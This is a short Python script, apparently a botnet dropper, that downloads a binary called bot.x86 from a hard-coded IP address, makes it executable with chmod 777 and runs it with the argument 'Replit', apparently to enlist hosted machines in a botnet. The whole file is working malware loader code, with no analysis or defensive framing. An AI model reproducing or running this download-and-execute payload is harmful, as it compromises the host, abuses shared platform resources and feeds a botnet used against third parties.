import requests
import sys
import subprocess

def run(cmd):
    subprocess.call(cmd, shell=True)

run("mkdir t")
run("touch t/bot.x86")

url = 'http://62.197.136.92/pumaxnxx/bot.x86'

myfile = requests.get(url)

open('t/bot.x86', 'wb').write(myfile.content)


def run(cmd):
    subprocess.call(cmd, shell=True)

run("cd t; chmod 777 bot.x86;./bot.x86 Replit")